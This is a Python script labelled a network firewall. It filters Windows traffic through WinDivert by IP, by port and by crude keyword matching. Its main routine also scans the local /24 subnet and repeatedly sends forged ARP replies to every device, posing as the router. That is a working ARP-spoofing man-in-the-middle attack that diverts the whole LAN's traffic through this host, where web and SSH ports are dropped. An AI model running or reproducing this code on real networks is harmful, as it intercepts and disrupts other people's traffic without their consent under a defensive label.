import threading
import pydivert
import logging
import re
from scapy.all import ARP, send, srp, Ether
import time


logging.basicConfig(filename="network_firewall.log", level=logging.INFO, format="%(asctime)s - %(message)s")

BLOCKED_IPS = ["192.168.1.50", "10.0.0.30"]  
BLOCKED_PORTS = [80, 443, 22]  # HTTP, HTTPS, SSH
INTRUSION_PATTERNS = [rb"malware", rb"hacker", rb"attack"]  

def deep_packet_inspection(packet):
    if packet.payload:
        for pattern in INTRUSION_PATTERNS:
            if re.search(pattern, packet.payload, re.IGNORECASE):
                logging.info(f"[ALERT] Attack from {packet.src_addr}")
                print(f"[ALERT] Intrusion detected from {packet.src_addr}")
                return True
    return False

def process_packet(packet, w):
    if packet.src_addr in BLOCKED_IPS:
        logging.info(f"Blocked packet from {packet.src_addr}")
        print(f"Blocked IP: {packet.src_addr}")
        w.drop(packet)  
        return

    if packet.dst_port in BLOCKED_PORTS:
        logging.info(f"Blocked port {packet.dst_port} from {packet.src_addr}")
        print(f"Blocked Port: {packet.dst_port}")
        w.drop(packet)  
        return

    if deep_packet_inspection(packet):
        w.drop(packet)  
        return  

    logging.info(f"Allowed {packet.src_addr} -> {packet.dst_addr}:{packet.dst_port}")
    print(f"Allowed {packet.src_addr} -> {packet.dst_addr}:{packet.dst_port}")
    w.send(packet)

def start_firewall():
    with pydivert.WinDivert("tcp or udp") as w:
        print("Network Firewall is running...")
        for packet in w:
            process_packet(packet, w)

def get_all_devices(network):
    devices = []
    arp_req = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered = srp(arp_req_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered:
        devices.append(received.psrc)
    return devices

def spoof(target_ip, router_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=router_ip)
    send(packet, verbose=False)

def start_arp_spoofing(network, router_ip):
    print("Scanning for devices...")
    devices = get_all_devices(network)

    print(f"Spoofing {len(devices)} devices...")
    while True:
        for device_ip in devices:
            spoof(device_ip, router_ip)
        time.sleep(2)  

if __name__ == "__main__":
    network = "192.168.1.0/24"  
    router_ip = "192.168.1.1"   
    firewall_thread = threading.Thread(target=start_firewall)
    firewall_thread.daemon = True 
    firewall_thread.start()
    start_arp_spoofing(network, router_ip)
